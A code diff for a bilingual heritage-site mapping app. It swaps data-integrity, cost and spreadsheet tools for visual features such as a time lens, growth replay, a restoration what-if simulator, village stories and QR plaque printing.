-function dvSafe(raw){ return (typeof LANG!=='undefined'&&LANG==='en'&&typeof trDictVal==='function')?trDictVal(raw):raw; }
-
-/* ============================================================
-   2) DATA INTEGRITY SCANNER
-   ============================================================ */
-function openIntegrity(){
-  const b=dcOpen(L('فحص جودة البيانات','Data integrity scan'),L('يفحص كامل السجل (٢٠,٨٠٠ موقع) عن مشاكل شائعة','Scans the full register for common issues'));
-  b.innerHTML=`<div class="xh-note">${L('جارِ الفحص…','Scanning…')}</div>`;
-  setTimeout(()=>{
-    const dupes=[]; const grid=new Map();
-    for(let i=0;i<DB.sites.length;i++){
-      const s=DB.sites[i];
-      const key=Math.round(s[2]*2000)+'_'+Math.round(s[3]*2000); // ~25m grid
-      const arr=grid.get(key); if(arr){ arr.push(i); } else grid.set(key,[i]);
-    }
-    grid.forEach(arr=>{ if(arr.length>1) dupes.push(arr); });
-
-    let outOfBounds=0, badAge=0, badDecay=0, noCoords=0;
-    for(const s of DB.sites){
-      if(s[2]<15||s[2]>33||s[3]<33||s[3]>56) outOfBounds++;
-      if(!s[2]&&!s[3]) noCoords++;
-      if(s[9]!=null&&(s[9]<0||s[9]>600)) badAge++;
-      if(s[10]!=null&&(s[10]<0||s[10]>1)) badDecay++;
-    }
-    const dupSites=dupes.reduce((a,g)=>a+g.length,0);
-    b.innerHTML=`
-      <div class="xh-kpirow">
-        <div class="xh-kpi"><b style="color:${dupes.length?'#e95345':'#2f6f72'}">${num(dupes.length)}</b><span>${L('مجموعات إحداثيات متطابقة تقريباً','near-duplicate coordinate groups')}</span></div>
-        <div class="xh-kpi"><b style="color:${outOfBounds?'#e95345':'#2f6f72'}">${num(outOfBounds)}</b><span>${L('إحداثيات خارج حدود المملكة تقريباً','coords outside approx. KSA bounds')}</span></div>
-        <div class="xh-kpi"><b style="color:${badAge+badDecay?'#e95345':'#2f6f72'}">${num(badAge+badDecay)}</b><span>${L('قيم عمر/تهدّم غير منطقية','implausible age/decay values')}</span></div>
-      </div>
-      <h4 class="xh-h4">${L(`مجموعات محتملة التكرار (${num(dupSites)} موقع)`,`Likely-duplicate groups (${num(dupSites)} sites)`)}</h4>
-      <div class="xh-rows">${dupes.slice(0,20).map(g=>`<div class="xh-row"><span class="xh-tag" style="background:var(--panel-2)">${num(g.length)}×</span>
-        <div class="xh-rowmain"><b>${siteName(DB.sites[g[0]])}</b><span class="xh-soft">${g.map(i=>num(DB.sites[i][0])).join(', ')}</span></div>
-        <span class="xh-soft" data-goto="${g[0]}" style="cursor:pointer;text-decoration:underline">${L('عرض','View')}</span></div>`).join('')||`<div class="xh-note">${L('لا يوجد','None found')}</div>`}</div>
-      ${dupes.length>20?`<div class="xh-note">${L(`+ ${num(dupes.length-20)} مجموعة أخرى — صدّر CSV للقائمة الكاملة`,`+ ${num(dupes.length-20)} more — export CSV for the full list`)}</div>`:''}
-      <div class="xh-actionrow" style="margin-top:12px"><button class="xh-btn ghost" id="dcIntCsv">⬇ CSV</button></div>`;
-    b.querySelectorAll('[data-goto]').forEach(x=>x.onclick=()=>{ dcClose(); setView('map'); gotoSite(+x.dataset.goto); });
-    $('dcIntCsv').onclick=()=>{
-      const lines=['group,code,name,lat,lng'];
-      dupes.forEach((g,gi)=>g.forEach(i=>{const s=DB.sites[i]; lines.push([gi+1,s[0],'"'+(s[1]||'').replace(/"/g,'""')+'"',s[2],s[3]].join(','));}));
-      const a=document.createElement('a'); a.href=URL.createObjectURL(new Blob(['﻿'+lines.join('\n')],{type:'text/csv;charset=utf-8'})); a.download='data_integrity_duplicates.csv'; a.click();
-    };
-  },30);
+function recStep(){
+  if(!_recState)return;
+  const {vs}=_recState;
+  if(_recState.step>=vs.length){ stopRecording(); return; }
+  const v=vs[_recState.step];
+  map.flyTo([v.lat,v.lng],12.5,2600);
+  ST.caption={title:stVName(v), sub:`${DB.govs[v.gov]} · ${DB.regions[v.reg]} — ${num(v.idxs.length)} ${L('مبنى تراثي','heritage buildings')}`};
+  map.invalidate();
+  _recState.step++;
+  _recState.timer=setTimeout(recStep,6200);
+}
+function stopRecording(){
+  if(!_recState)return;
+  clearTimeout(_recState.timer); clearInterval(_recState.clock);
+  try{ _recState.rec.stop(); }catch(e){}
+  _recState=null;
+  ST.caption=null; map.invalidate();
+  $('stRecBar').classList.remove('show');
 }
 
 /* ============================================================
-   3) RESTORATION COST ESTIMATOR
+   2) TIME LENS
    ============================================================ */
-const COST_BASE={bldg:180000, zone:650000}; // SAR, rough per-asset baseline
-function openCost(){
-  const b=dcOpen(L('تقدير تكلفة الترميم','Restoration cost estimate'),L('تقدير تقريبي غير رسمي بناءً على نسبة التهدّم والفئة والنوع','Rough, unofficial estimate from decay %, class & type'));
-  const vis=DB.sites.filter(passes);
-  let total=0, n=0;
-  const byReg={};
-  for(const s of vis){
-    const base=DB.types[s[7]]==='منطقة'?COST_BASE.zone:COST_BASE.bldg;
-    const decay=s[10]!=null?s[10]:0.3;
-    const clsW={'أ':1.4,'ب':1.15,'ج':0.9,'غير مصنّف':0.8}[DB.classes[s[6]]]||0.8;
-    const cost=base*decay*clsW;
-    total+=cost; n++;
-    byReg[s[4]]=(byReg[s[4]]||0)+cost;
+function toggleLens(){
+  if(ST.lens){ closeLens(); toast(L('تم إغلاق عدسة الزمن','Time lens closed')); dcClose(); return; }
+  dcClose(); setView('map');
+  const r=Math.min(map.w,map.h)*0.22||130;
+  ST.lens={x:map.w/2,y:map.h/2,r:Math.max(90,Math.min(170,r)),year:2046};
+  // drag handle
+  let h=$('stLensHandle');
+  if(!h){
+    h=el('div',null,''); h.id='stLensHandle';
+    map.el.appendChild(h);
+    let dragging=false,ox=0,oy=0;
+    const down=e=>{ dragging=true; const p=e.touches?e.touches[0]:e; ox=p.clientX; oy=p.clientY; e.preventDefault(); e.stopPropagation(); };
+    const move=e=>{ if(!dragging||!ST.lens)return; const p=e.touches?e.touches[0]:e;
+      ST.lens.x+=p.clientX-ox; ST.lens.y+=p.clientY-oy; ox=p.clientX; oy=p.clientY;
+      positionLensHandle(); map.invalidate(); e.preventDefault(); };
+    const up=()=>{ dragging=false; };
+    h.addEventListener('mousedown',down); window.addEventListener('mousemove',move); window.addEventListener('mouseup',up);
+    h.addEventListener('touchstart',down,{passive:false}); window.addEventListener('touchmove',move,{passive:false}); window.addEventListener('touchend',up);
   }
-  const regSorted=Object.entries(byReg).sort((a,b)=>b[1]-a[1]).slice(0,10);
-  const fmt=v=>(v>=1e9?(v/1e9).toFixed(1)+L(' مليار',' B'):v>=1e6?(v/1e6).toFixed(1)+L(' مليون',' M'):num(Math.round(v)));
+  h.style.display='block';
+  positionLensHandle();
+  map.invalidate();
+  toast(L('🔮 اسحب العدسة فوق أي منطقة — داخلها ترى ٢٠٤٦','🔮 Drag the lens — inside it you see 2046'));
+}
+function positionLensHandle(){
+  const h=$('stLensHandle'); if(!h||!ST.lens)return;
+  h.style.left=(ST.lens.x-ST.lens.r)+'px';
+  h.style.top=(ST.lens.y-ST.lens.r)+'px';
+  h.style.width=h.style.height=(ST.lens.r*2)+'px';
+}
+function closeLens(){
+  ST.lens=null;
+  const h=$('stLensHandle'); if(h)h.style.display='none';
+  map.invalidate();
+}
+
+/* ============================================================
+   3) GROWTH REPLAY
+   ============================================================ */
+let _replayOn=false,_replayRAF=null;
+function startReplay(){
+  if(_replayOn){ stopReplay(); return; }
+  dcClose(); setView('map');
+  // order: regions by count desc, sites grouped per region
+  const regCount={}; DB.sites.forEach(s=>regCount[s[4]]=(regCount[s[4]]||0)+1);
+  const regOrder=Object.keys(regCount).map(Number).sort((a,b)=>regCount[b]-regCount[a]);
+  const ordered=[];
+  for(const ri of regOrder) for(let i=0;i<DB.sites.length;i++){ const s=DB.sites[i]; if(s[4]===ri) ordered.push({s,i,ri}); }
+  const pts=ordered.map(o=>({lat:o.s[2],lng:o.s[3],color:clsColor(o.s[6]),zone:DB.types[o.s[7]]==='منطقة',data:{idx:o.i,lat:o.s[2],lng:o.s[3]}}));
+  _replayOn=true;
+  map.closePopup(); map.fitBounds(SA,0.05);
+  $('stReplayHud').classList.add('show');
+  const total=pts.length, durMs=22000, t0=performance.now();
+  let lastK=0;
+  const step=now=>{
+    if(!_replayOn)return;
+    const p=Math.min(1,(now-t0)/durMs);
+    const eased=p<0.5 ? 2*p*p : 1-Math.pow(-2*p+2,2)/2;
+    const k=Math.max(1,Math.round(total*eased));
+    if(k!==lastK){
+      map.setPoints(pts.slice(0,k));
+      lastK=k;
+      $('stReplayCount').textContent=num(k);
+      const cur=ordered[Math.min(k,total)-1];
+      $('stReplayRegion').textContent=DB.regions[cur.ri];
+    }
+    if(p<1)_replayRAF=requestAnimationFrame(step);
+    else{
+      $('stReplayRegion').textContent=L('السجل الوطني مكتمل ✓','National register complete ✓');
+      setTimeout(stopReplay,2600);
+    }
+  };
+  _replayRAF=requestAnimationFrame(step);
+}
+function stopReplay(){
+  if(!_replayOn)return;
+  _replayOn=false; cancelAnimationFrame(_replayRAF);
+  $('stReplayHud').classList.remove('show');
+  render();
+}
+
+/* ============================================================
+   4) RESTORATION WHAT-IF
+   ============================================================ */
+function healthOf(list,simSet){
+  let dS=0,dN=0,urg=0;
+  for(const s of list){
+    let d=s[10];
+    if(simSet&&simSet.has(s[0])) d=0.1;
+    if(d!=null){ dS+=d; dN++; if(d>=0.5)urg++; }
+  }
+  const avg=dN?dS/dN:0.3, urgP=dN?urg/dN:0;
+  const raw=Math.max(0,Math.min(100,100-(avg*100*0.7+urgP*100*0.3)));
+  return { score:Math.round(raw), raw, urgent:urg };
+}
+function openWhatIf(){
+  const b=dcOpen(L('محاكي «ماذا لو رمّمنا؟»','Restoration what-if simulator'),L('اختر نطاق ترميم افتراضي وشاهد أثره الفوري على مؤشر صحة التراث الوطني','Pick a hypothetical restoration scope and watch the national index respond'));
+  const regCount={}; DB.sites.forEach(s=>regCount[s[4]]=(regCount[s[4]]||0)+1);
+  const regOrder=Object.keys(regCount).map(Number).sort((a,b)=>regCount[b]-regCount[a]);
   b.innerHTML=`
-    <div class="xh-kpirow"><div class="xh-kpi"><b>${fmt(total)} ${L('ر.س','SAR')}</b><span>${L('إجمالي تقديري للمُصفّى الحالي','estimated total for current filter')}</span></div>
-      <div class="xh-kpi"><b>${n?fmt(total/n):0}</b><span>${L('متوسط لكل موقع','avg per site')}</span></div></div>
-    <h4 class="xh-h4">${L('أعلى ١٠ مناطق تكلفة تقديرية','Top 10 regions by estimated cost')}</h4>
-    <div class="xh-rows">${regSorted.map(([ri,c],k)=>`<div class="xh-row"><span class="xh-rank">${num(k+1)}</span>
-      <div class="xh-rowmain"><b>${DB.regions[ri]}</b></div><span class="xh-tag" style="background:var(--panel-2)">${fmt(c)} ${L('ر.س','SAR')}</span></div>`).join('')}</div>
-    <div class="xh-note">${L('المعادلة: تكلفة أساسية حسب النوع × نسبة التهدّم × معامل الفئة. رقم استرشادي لتحديد الأولويات المالية وليس عرض سعر هندسي.',
-      'Formula: type baseline × decay % × class multiplier. A planning heuristic, not an engineering quote.')}</div>`;
-}
-
-/* ============================================================
-   4) LIVE SPREADSHEET
-   ============================================================ */
-let _sheetPage=0, _sheetPageSize=50;
-function openSheet(){
-  const b=dcOpen(L('وضع الجدول الحي','Live spreadsheet'),L('عدّل نسبة التهدّم، العمر، والفئة مباشرة — يُحفظ محلياً فوراً','Edit decay, age & class inline — saved locally instantly'));
-  _sheetPage=0;
-  b.innerHTML=`<div class="dc-sheet-wrap"><table class="dc-sheet"><thead><tr>
-    <th>${L('الكود','Code')}</th><th>${L('الاسم','Name')}</th><th>${L('المنطقة','Region')}</th>
-    <th>${L('الفئة','Class')}</th><th>${L('العمر','Age')}</th><th>${L('التهدّم %','Decay %')}</th></tr></thead>
-    <tbody id="dcSheetBody"></tbody></table></div>
-    <div class="xh-actionrow" style="margin-top:10px"><button class="xh-btn ghost" id="dcSheetPrev">‹ ${L('السابق','Prev')}</button>
-    <span id="dcSheetPage" class="xh-soft" style="align-self:center"></span>
-    <button class="xh-btn ghost" id="dcSheetNext">${L('التالي','Next')} ›</button></div>`;
-  renderSheetPage();
-  $('dcSheetPrev').onclick=()=>{ if(_sheetPage>0){_sheetPage--; renderSheetPage();} };
-  $('dcSheetNext').onclick=()=>{ _sheetPage++; renderSheetPage(); };
-}
-function renderSheetPage(){
-  const vis=DB.sites.filter(passes);
-  const totalPages=Math.max(1,Math.ceil(vis.length/_sheetPageSize));
-  _sheetPage=Math.max(0,Math.min(_sheetPage,totalPages-1));
-  const slice=vis.slice(_sheetPage*_sheetPageSize,(_sheetPage+1)*_sheetPageSize);
-  $('dcSheetBody').innerHTML=slice.map(s=>{
-    const idx=DB.sites.indexOf(s);
-    return `<tr data-code="${s[0]}"><td>${num(s[0])}</td><td class="dc-sheet-name" data-goto="${idx}">${siteName(s)}</td><td>${DB.regions[s[4]]}</td>
-      <td><select class="dc-cls">${DB.classes.map((c,i)=>`<option value="${i}" ${i===s[6]?'selected':''}>${LANG==='ar'?c:(CLASS_META[c]?CLASS_META[c].eshort:c)}</option>`).join('')}</select></td>
-      <td><input class="dc-age" type="number" min="0" max="600" value="${s[9]??''}"></td>
-      <td><input class="dc-decay" type="number" min="0" max="100" value="${s[10]!=null?Math.round(s[10]*100):''}"></td></tr>`;
-  }).join('');
-  $('dcSheetPage').textContent=L(`صفحة ${num(_sheetPage+1)} من ${num(totalPages)} — ${num(vis.length)} موقع`,`Page ${num(_sheetPage+1)} of ${num(totalPages)} — ${num(vis.length)} sites`);
-  $('dcSheetBody').querySelectorAll('.dc-sheet-name').forEach(td=>td.onclick=()=>{ dcClose(); setView('map'); gotoSite(+td.dataset.goto); });
-  $('dcSheetBody').querySelectorAll('tr').forEach(tr=>{
-    const code=+tr.dataset.code;
-    const site=DB.sites.find(x=>x[0]===code); if(!site) return;
-    tr.querySelector('.dc-cls').onchange=e=>{ site[6]=+e.target.value; saveSheetEdit(code,'class',site[6]); render(); };
-    tr.querySelector('.dc-age').onchange=e=>{ const v=e.target.value===''?null:Math.max(0,+e.target.value); site[9]=v; saveSheetEdit(code,'age',v); render(); };
-    tr.querySelector('.dc-decay').onchange=e=>{ const v=e.target.value===''?null:Math.max(0,Math.min(100,+e.target.value))/100; site[10]=v; saveSheetEdit(code,'decay',v); render(); };
-  });
-}
-const SHEET_EDITS_KEY='heritage_sheet_edits_v1';
-function saveSheetEdit(code,field,value){
-  try{
-    const store=JSON.parse(localStorage.getItem(SHEET_EDITS_KEY)||'{}');
-    (store[code]=store[code]||{})[field]=value; store[code].ts=Date.now();
-    localStorage.setItem(SHEET_EDITS_KEY,JSON.stringify(store));
-    if(typeof logAudit==='function') logAudit('sheet_edit',code+' — '+field+'='+value);
-    toast(L('تم الحفظ','Saved'));
-  }catch(e){}
-}
-// re-apply saved sheet edits on top of baked data at load
-(function applySheetEdits(){
-  try{
-    const store=JSON.parse(localStorage.getItem(SHEET_EDITS_KEY)||'{}');
-    for(const code in store){
-      const site=DB.sites.find(s=>String(s[0])===String(code)); if(!site) continue;
-      const e=store[code];
-      if(e.class!=null) site[6]=e.class;
-      if('age' in e) site[9]=e.age;
-      if('decay' in e) site[10]=e.decay;
+    <div class="xh-chips">
+      <button class="xh-chip sel" data-scope="top100">${L('أعلى ١٠٠ موقع خطورة','Top 100 risky')}</button>
+      <button class="xh-chip" data-scope="filter">${L('كل الفلتر الحالي','Entire current filter')}</button>
+      <button class="xh-chip" data-scope="region">${L('منطقة كاملة:','Whole region:')}</button>
+      <select id="stWiRegion" class="xh-in" style="width:auto;padding:6px 10px">${regOrder.map(ri=>`<option value="${ri}">${DB.regions[ri]}</option>`).join('')}</select>
+    </div>
+    <div id="stWiResult"></div>
+    <div class="xh-actionrow"><button class="xh-btn ghost" id="stWiShow">👁 ${L('أظهر الأثر على الخريطة ٥ ثوانٍ','Show effect on map for 5s')}</button></div>
+    <div class="xh-note">${L('الترميم الافتراضي = خفض تهدّم المواقع المختارة إلى ١٠٪. المؤشر الوطني يُحسب على كامل السجل.','Hypothetical restoration = selected sites decay drops to 10%. Index computed over the full register.')}</div>`;
+  let scope='top100', lastSet=null;
+  const gauge=(score,label,color)=>{
+    const C=2*Math.PI*15.9155;
+    return `<div class="stWiGauge"><svg viewBox="0 0 42 42">
+      <circle cx="21" cy="21" r="15.9155" fill="none" stroke="var(--panel-2)" stroke-width="4.5"/>
+      <circle cx="21" cy="21" r="15.9155" fill="none" stroke="${color}" stroke-width="4.5" stroke-linecap="round"
+        stroke-dasharray="${(score/100*C).toFixed(1)} ${C}" transform="rotate(-90 21 21)"/>
+      <text x="21" y="23.5" text-anchor="middle" font-size="10.5" font-weight="800" fill="${color}" font-family="Reem Kufi">${num(score)}</text>
+    </svg><span>${label}</span></div>`;
+  };
+  const compute=()=>{
+    let chosen;
+    if(scope==='top100'){
+      chosen=DB.sites.filter(s=>passes(s)).map(s=>({s,r:riskScore(s)})).sort((a,b)=>b.r-a.r).slice(0,100).map(o=>o.s);
+    } else if(scope==='filter'){
+      chosen=DB.sites.filter(passes);
+    } else {
+      const ri=+$('stWiRegion').value;
+      chosen=DB.sites.filter(s=>s[4]===ri);
     }
-  }catch(e){}
-})();
+    const simSet=new Set(chosen.map(s=>s[0]));
+    lastSet=simSet;
+    const before=healthOf(DB.sites,null);
+    const after=healthOf(DB.sites,simSet);
+    const deltaRaw=after.raw-before.raw;
+    const deltaTxt=Math.abs(deltaRaw)>=1?(deltaRaw>0?'+':'')+num(Math.round(deltaRaw)):(deltaRaw>0?'+':'')+deltaRaw.toFixed(1);
+    const dc2=deltaRaw>0?'#2f6f72':'#9bb0b6';
+    $('stWiResult').innerHTML=`
+      <div class="stWiRow">
+        ${gauge(before.score,L('اليوم','Today'),'#9bb0b6')}
+        <div class="stWiDelta" style="color:${dc2}">${deltaTxt}<span>${L('نقطة','pts')}</span><b>⟵</b></div>
+        ${gauge(after.score,L('بعد الترميم','After restoration'),'#2f6f72')}
+      </div>
+      <div class="xh-kpirow">
+        <div class="xh-kpi"><b>${num(simSet.size)}</b><span>${L('موقع في خطة الترميم','sites in the plan')}</span></div>
+        <div class="xh-kpi"><b style="color:#2f6f72">−${num(before.urgent-after.urgent)}</b><span>${L('مواقع تخرج من قائمة الملحّة','sites leave the urgent list')}</span></div>
+      </div>`;
+  };
+  b.querySelectorAll('[data-scope]').forEach(c=>c.onclick=()=>{
+    b.querySelectorAll('[data-scope]').forEach(x=>x.classList.remove('sel'));
+    c.classList.add('sel'); scope=c.dataset.scope; compute();
+  });
+  $('stWiRegion').onchange=()=>{ if(scope==='region')compute(); };
+  $('stWiShow').onclick=()=>{
+    if(!lastSet)return;
+    dcClose(); setView('map');
+    const pts=[];
+    for(let i=0;i<DB.sites.length;i++){
+      const s=DB.sites[i]; if(!passes(s))continue;
+      const restored=lastSet.has(s[0]);
+      pts.push({lat:s[2],lng:s[3],color:restored?'#2f6f72':clsColor(s[6]),zone:DB.types[s[7]]==='منطقة',data:{idx:i,lat:s[2],lng:s[3]}});
+    }
+    map.setPoints(pts);
+    toast(L('المواقع الخضراء = خطة الترميم الافتراضية','Green sites = the hypothetical plan'));
+    setTimeout(()=>render(),5000);
+  };
+  compute();
+}
 
 /* ============================================================
-   5) SMART CSV IMPORTER
+   5) VILLAGE STORIES (scrollytelling)
+   ============================================================ */
+let _storyState=null;
+function openStories(){
+  const vs=stVillages();
+  const b=dcOpen(L('قصص القرى التفاعلية','Interactive village stories'),L('اختر قرية — وستتحول لرحلة سردية فصولها مبانٍ حقيقية على الخريطة','Pick a village — it becomes a guided narrative over the map'));
+  b.innerHTML=`<input class="xh-in" id="stStSearch" placeholder="${L('ابحث عن قرية…','Search villages…')}" style="margin-bottom:12px">
+    <div class="xh-rows" id="stStList"></div>`;
+  const renderList=q=>{
+    const nq=(q||'').trim();
+    const list=vs.filter(v=>!nq||v.name.includes(nq)||stVName(v).toLowerCase().includes(nq.toLowerCase())).slice(0,40);
+    $('stStList').innerHTML=list.map(v=>`<div class="xh-row" data-v="${vs.indexOf(v)}" style="cursor:pointer">
+      <div class="xh-rowmain"><b>${stVName(v)}</b><span class="xh-soft">${DB.govs[v.gov]} · ${DB.regions[v.reg]}</span></div>
+      <span class="xh-tag" style="background:var(--panel-2)">${num(v.idxs.length)}</span></div>`).join('');
+    $('stStList').querySelectorAll('[data-v]').forEach(r=>r.onclick=()=>beginStory(vs[+r.dataset.v]));
+  };
+  renderList('');
+  $('stStSearch').oninput=e=>renderList(e.target.value);
+}
+function beginStory(v){
+  dcClose(); setView('map');
+  // chapters: intro + top 6 buildings by risk
+  const picks=v.idxs.map(i=>({i,r:riskScore(DB.sites[i])})).sort((a,b)=>b.r-a.r).slice(0,6);
+  const chapters=[{type:'intro'}].concat(picks.map(p=>({type:'site',idx:p.i})));
+  _storyState={v,chapters,ch:0};
+  $('stStory').classList.add('show');
+  storyGo(0);
+}
+function storyGo(n){
+  const st=_storyState; if(!st)return;
+  st.ch=Math.max(0,Math.min(st.chapters.length-1,n));
+  const c=st.chapters[st.ch];
+  const card=$('stStoryCard');
+  card.classList.remove('in');
+  if(c.type==='intro'){
+    map.flyTo([st.v.lat,st.v.lng],13.2,1600);
+    setTimeout(()=>{
+      card.innerHTML=`<div class="stc-k">${L('الفصل','Chapter')} ${num(1)} / ${num(st.chapters.length)}</div>
+        <h3>${stVName(st.v)}</h3>
+        <p>${DB.govs[st.v.gov]} · ${DB.regions[st.v.reg]}</p>
+        <p><b>${num(st.v.idxs.length)}</b> ${L('مبنى تراثي موثّق','documented heritage buildings')}${st.v.avgDecay!=null?` — ${L('متوسط التهدّم','avg decay')} <b>${num(st.v.avgDecay)}٪</b>`:''}</p>
+        <p class="stc-hint">${L('مرّر بالعجلة أو الأسهم لبدء الرحلة ↓','Scroll or use arrows to begin ↓')}</p>`;
+      card.classList.add('in');
+    },600);
+  } else {
+    const s=DB.sites[c.idx];
+    map.flyTo([s[2],s[3]],16.4,1500);
+    const dvv=i=>{ const raw=(i>=0&&i!=null)?DB.dict[i]:null; return (raw!=null&&LANG==='en'&&typeof trDictVal==='function')?trDictVal(raw):raw; };
+    const mats=(s[16]||[]).map(dvv).filter(Boolean).join('، ');
+    setTimeout(()=>{
+      card.innerHTML=`<div class="stc-k">${L('الفصل','Chapter')} ${num(st.ch+1)} / ${num(st.chapters.length)}</div>
+        <h3>${siteName(s)}</h3>
+        <p>${L('الفئة','Class')}: <b style="color:${clsColor(s[6])}">${LANG==='ar'?DB.classes[s[6]]:(CLASS_META[DB.classes[s[6]]]?CLASS_META[DB.classes[s[6]]].eshort:DB.classes[s[6]])}</b>
+        ${s[10]!=null?` — ${L('التهدّم','Decay')}: <b>${num(Math.round(s[10]*100))}٪</b>`:''}
+        ${s[9]!=null?` — ${L('العمر','Age')}: <b>${num(s[9])}</b> ${L('سنة','yrs')}`:''}</p>
+        ${mats?`<p>${L('مواد البناء','Materials')}: ${mats}</p>`:''}
+        <button class="xh-btn ghost" style="margin-top:6px" onclick="openStory(${c.idx})">${L('التفاصيل الكاملة','Full details')}</button>`;
+      card.classList.add('in');
+    },600);
+  }
+  // dots
+  $('stStoryDots').innerHTML=st.chapters.map((_,i)=>`<span class="${i===st.ch?'on':''}" data-d="${i}"></span>`).join('');
+  $('stStoryDots').querySelectorAll('span').forEach(d=>d.onclick=()=>storyGo(+d.dataset.d));
+}
+function endStory(){
+  _storyState=null;
+  $('stStory').classList.remove('show');
+  $('stStoryCard').classList.remove('in');
+}
+
+/* ============================================================
+   6) VINTAGE MAP
+   ============================================================ */
+let _vintageOn=false;
+function toggleVintage(){
+  _vintageOn=!_vintageOn;
+  document.body.classList.toggle('vintage-on',_vintageOn);
+  let vg=$('stVignette');
+  if(_vintageOn){
+    if(!vg){ vg=el('div',null,''); vg.id='stVignette'; map.el.appendChild(vg); }
+    vg.style.display='block';
+    toast(L('🗺️ وضع المخطوطة العتيقة مفعّل','🗺️ Vintage manuscript mode on'));
+  } else {
+    if(vg)vg.style.display='none';
+    toast(L('عدنا للخريطة الحديثة','Back to the modern map'));
+  }
+  map.invalidate();
+  dcClose();
+}
+
+/* ============================================================
+   7) FIELD PLAQUES GENERATOR
+   ============================================================ */
+function openPlaques(){
+  const b=dcOpen(L('مولّد اللوحات التعريفية الميدانية','Field plaque generator'),L('لوحات A5 وملصقات QR جاهزة للطباعة والتثبيت على المواقع نفسها','Print-ready A5 plaques & QR sticker sheets for the physical sites'));
+  b.innerHTML=`
+    <div class="xh-kpirow">
+      <div class="xh-kpi" style="text-align:start"><span style="font-size:12px">${L('عدد المواقع (الأعلى خطورة من الفلتر الحالي)','Site count (top risky from current filter)')}</span>
+        <input class="xh-in" id="stPlqN" type="number" min="1" max="40" value="8" style="margin-top:6px"></div>
+    </div>
+    <div class="xh-actionrow">
+      <button class="xh-btn" id="stPlqA5">🖼 ${L('لوحات A5 (لوحة لكل موقع)','A5 plaques (one per site)')}</button>
+      <button class="xh-btn ghost" id="stPlqStk">🏷 ${L('ملصقات QR (8 لكل صفحة)','QR stickers (8 per page)')}</button></div>
+    <div class="xh-note">${L('كل لوحة تحمل اسم الموقع وفئته ورمز QR يفتح صفحته الكاملة على المنصة — ثبّتها على المبنى ليصبح متصلاً بسجله الرقمي.','Each plaque carries the site name, class and a QR opening its full page — mount it on the building to link it to its digital record.')}</div>`;
+  const chosen=()=>{
+    const n=Math.max(1,Math.min(40,+$('stPlqN').value||8));
+    return DB.sites.map((s,i)=>({s,i,r:riskScore(s)})).filter(o=>passes(o.s)).sort((a,b)=>b.r-a.r).slice(0,n);
+  };
+  const qrUrl=(s,size)=>`https://api.qrserver.com/v1/create-qr-code/?size=${size}x${size}&margin=0&data=${encodeURIComponent(location.origin+location.pathname+'#asset/'+s[0])}`;
+  $('stPlqA5').onclick=()=>{
+    const list=chosen();
+    $('pdfReport').innerHTML=`<div class="pdfr-inner" style="padding:0">${list.map(o=>{
+      const s=o.s, cm=CLASS_META[DB.classes[s[6]]];
+      return `<div class="stPlq">
+        <div class="stPlq-band"></div>
+        ${window.HC_LOGO?`<img class="stPlq-logo" src="${window.HC_LOGO}" alt="">`:''}
+        <div class="stPlq-reg">${t('reg_name')}</div>
+        <h2>${siteName(s)}</h2>
+        <div class="stPlq-loc">${DB.govs[s[5]]} · ${DB.regions[s[4]]}</div>
+        <div class="stPlq-cls" style="background:${cm?cm.color:'#999'}">${LANG==='ar'?(cm?cm.ar:''):(cm?cm.en:'')}</div>
+        <img class="stPlq-qr" src="${qrUrl(s,240)}" alt="QR">
+        <div class="stPlq-code">${t('code_m')}: ${num(s[0])}</div>
+        <div class="stPlq-foot">${L('امسح الرمز لفتح السجل الرقمي الكامل لهذا الأصل','Scan to open this asset’s full digital record')}</div>
+      </div>`;}).join('')}</div>`;
+    dcClose();
+    document.body.classList.add('printing-report');
+    setTimeout(()=>{ window.print(); setTimeout(()=>document.body.classList.remove('printing-report'),400); },600);
+  };
+  $('stPlqStk').onclick=()=>{
+    const list=chosen();
+    $('pdfReport').innerHTML=`<div class="pdfr-inner"><div class="stStkGrid">${list.map(o=>{
+      const s=o.s;
+      return `<div class="stStk"><img src="${qrUrl(s,150)}" alt="QR"><b>${siteName(s)}</b><span>${num(s[0])} · ${DB.govs[s[5]]}</span></div>`;}).join('')}</div>
+      <div class="pdfr-foot">${t('reg_name')}</div></div>`;
+    dcClose();
+    document.body.classList.add('printing-report');
+    setTimeout(()=>{ window.print(); setTimeout(()=>document.body.classList.remove('printing-report'),400); },600);
+  };
+}
+
+/* ============================================================
+   8) TEMPORAL HEAT MAP
+   ============================================================ */
+function openTemporalHeat(){
+  const b=dcOpen(L('الخريطة الحرارية عبر الزمن','Temporal heat map'),L('شاهد كثافة التراث تتشكل من الأقدم إلى الأحدث','Watch heritage density bloom from oldest to newest'));
+  b.innerHTML=`
+    <div class="xh-yearrow"><span class="xh-year" id="stThVal">${L('الكل','All')}</span>
+      <input type="range" id="stThRange" min="0" max="400" value="0" step="20" style="flex:1;direction:ltr">
+      <button class="xh-btn ghost" id="stThPlay">▶ ${L('تشغيل الرحلة','Play the journey')}</button></div>
+    <div class="xh-kpirow"><div class="xh-kpi"><b id="stThCount">—</b><span>${L('موقع ظاهر في الطبقة الحرارية','sites in the heat layer')}</span></div></div>
+    <div class="xh-note">${L('اسحب: يمين = مواقع أقدم فقط. الطبقة الحرارية مفعّلة تلقائياً أثناء العرض.','Drag right = only older sites. Heat layer auto-enabled while open.')}</div>`;
+  const prevHeat=(typeof _heatOn!=='undefined')?_heatOn:false;
+  map.showHeat(true);
+  const apply=v=>{
+    _studioAgeMin=v>0?v:null;
+    $('stThVal').textContent=v>0?('≥ '+num(v)+' '+L('سنة','yrs')):L('الكل','All');
+    render();
+    let c=0; for(const s of DB.sites) if(passes(s))c++;
+    $('stThCount').textContent=num(c);
+  };
+  $('stThRange').oninput=e=>apply(+e.target.value);
+  let playT=null;
+  $('stThPlay').onclick=function(){
+    if(playT){ clearInterval(playT); playT=null; this.textContent='▶ '+L('تشغيل الرحلة','Play the journey'); return; }
+    this.textContent='⏸ '+L('إيقاف','Pause');
+    let v=400; $('stThRange').value=v; apply(v);
+    playT=setInterval(()=>{
+      v-=20;
+      if(v<0){ clearInterval(playT); playT=null; const p=$('stThPlay'); if(p)p.textContent='▶ '+L('تشغيل الرحلة','Play the journey'); return; }
+      const r=$('stThRange'); if(!r){ clearInterval(playT); playT=null; return; }
+      r.value=v; apply(v);
+    },700);
+  };
+  apply(0);
+  _dcOnClose=()=>{ if(playT)clearInterval(playT); _studioAgeMin=null; map.showHeat(prevHeat); render(); };
+}
+
+/* ============================================================
+   9) DUAL SYNCED MAPS
+   ============================================================ */
+let _dualMaps=null,_dualSync=null;
+function openDual(){
+  dcClose();
+  $('stDual').classList.add('show');
